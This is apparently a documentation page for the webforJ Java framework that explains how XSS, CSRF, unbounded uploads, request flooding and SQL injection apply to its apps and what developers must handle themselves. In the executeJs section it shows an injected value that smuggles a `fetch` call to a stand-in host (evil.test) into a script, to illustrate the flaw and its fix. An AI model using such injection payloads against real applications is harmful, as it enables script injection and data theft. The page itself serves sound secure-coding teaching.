---
sidebar_position: 2
title: Common Threats
description: How common web threats such as cross-site scripting (XSS), cross-site request forgery (CSRF), and SQL injection apply to a webforJ app, what the framework handles, and where you stay responsible.
---

Because a webforJ app runs in Java on the server and the browser only renders the interface (see the [Client/Server Interaction](/docs/architecture/client-server) article), several classes of attack are contained by design. Others still depend on how you write your code. This page walks through the threats that matter most and draws a clear line between what webforJ handles and what's yours to handle.

## Cross-site scripting (XSS) {#cross-site-scripting-xss}

A cross-site scripting (XSS) attack succeeds when a string meant to be shown as text is instead interpreted as live markup in the browser. webforJ closes this off by default: when you set a component's text, the value is shown literally, so tags inside it appear as characters and never run.

```java
// Shown as the literal characters "<b>hi</b>"
component.setText("<b>hi</b>");
```

Rendering real markup is a separate, deliberate step. webforJ treats a value as markup only when it's wrapped in `<html>...</html>`, which is exactly what the `HasHtml` concern's `setHtml` method does for you under the hood. A value set any other way is reduced to plain text first.

```java
// Rendered as markup, on purpose
component.setHtml("<b>hi</b>");
```

:::danger Markup you opt into isn't cleaned for you
The framework doesn't scrub the markup you wrap in `<html>`. The moment any fragment of it originates from a person, a stored record, a query string, or any other source you don't fully control, clean it yourself before it reaches a component. Reach for a maintained cleaner such as [jsoup](https://jsoup.org/) or the [OWASP Java HTML Sanitizer](https://owasp.org/www-project-java-html-sanitizer/) and feed it an allowlist of the tags you actually intend to permit.
:::

### Executing JavaScript {#executing-javascript}

The same rule extends to the scripts you run on the client with `executeJs` and its async variants (the <JavadocLink type="foundation" location="com/webforj/concern/HasJsExecution" code='true'>HasJsExecution</JavadocLink> API). `executeJs` runs the string you give it as a program, so whatever ends up inside that string is what the browser executes, including anything you spliced in from an untrusted value.

```java
// Dangerous: the value is built into the program text
el.executeJs("greet('" + name + "')");
```

If `name` holds `'); fetch('https://evil.test'); ('`, the browser runs the following program instead:

```js
greet(''); fetch('https://evil.test'); ('')
```

The attacker's `fetch` is now a statement in your program, so it executes. Concatenation is what made the input *part of the code*.

Keep untrusted values out of the script entirely. Send the value to the client as data, set it on the element, then run a fixed script that reads it back through the `component` keyword:

```java
// Safe: the value is data the script reads, never code
el.setProperty("greetName", name);
el.executeJs("greet(component.greetName)");
```

Here the program the browser runs is always just `greet(component.greetName)`. There's no untrusted input in it to parse. The value sits in a property, and reading a string value never executes it, so the very same `name` is passed to `greet` as text instead of run as code.

## Cross-site request forgery (CSRF) {#cross-site-request-forgery-csrf}

A cross-site request forgery (CSRF) attack tricks a signed-in user's browser into sending an action the user never intended. webforJ blocks this for its own traffic without any setup: the framework only trusts requests that belong to the current user's session, so a page on another origin can't drive the app on the user's behalf.

This becomes visible in exactly one situation. [Spring Security](/docs/security/getting-started) turns on its own forged-request protection for every request, and it has no knowledge of webforJ's channel, so it would reject the framework's traffic and the app would fail to load. The webforJ Spring integration settles this for you: <JavadocLink type="spring-integration" location="com/webforj/spring/security/WebforjSecurityConfigurer" suffix="#webforj()" code='true'>WebforjSecurityConfigurer.webforj()</JavadocLink> tells Spring to skip its verification for webforJ's framework requests. That's safe because the framework already protects those requests itself, so nothing is left unguarded.

:::info Hand-rolled Spring configuration
If you assemble a `SecurityFilterChain` without the `webforj()` helper, exclude the framework's requests from Spring's verification yourself, and leave that verification switched on for any endpoints you add.
:::

## Unbounded file uploads {#unbounded-file-uploads}

Accepting files of any size or quantity invites denial of service through exhausted memory, disk, or bandwidth. Cap what you accept on the upload components: they expose `setMaxFileSize()` to limit each file and `setMaxFiles()` to limit how many arrive at once.

Treat that as the first line rather than the only one. A browser-side limit can be bypassed, so enforce a ceiling on the server as well: set `webforj.fileUpload.maxSize` in your [configuration](/docs/configuration/properties) to reject oversized uploads before they reach your code, and bound the maximum request size at your servlet container or reverse proxy.

## Request flooding {#request-flooding}

A manipulated client can also try to overwhelm the server outright: sending a single very large request, or starting new app sessions in quick succession until memory or other resources run out. Because the server drives every app, a flood of either kind reaches it directly.

webforJ can bound both. Set `webforj.security.maxContentLength` to cap, in bytes, the size of a request the app accepts, and `webforj.security.maxInitPerMinute` to cap how many new app sessions start each minute. Both default to `0`, which leaves them off, so set them for any deployment open to untrusted traffic. See [Property Configuration](/docs/configuration/properties) for details.

As with uploads, treat these as the inner layer and bound the request size at your servlet container or reverse proxy as well.

## SQL injection {#sql-injection}

webforJ sits nowhere near your data layer, so resistance to SQL injection rests entirely on your query code. Use parameterized queries or prepared statements so that values are bound as parameters rather than concatenated into the statement, and never build a query by joining strings with user input. This is ordinary JDBC and persistence-layer practice, and it applies unchanged in a webforJ app.
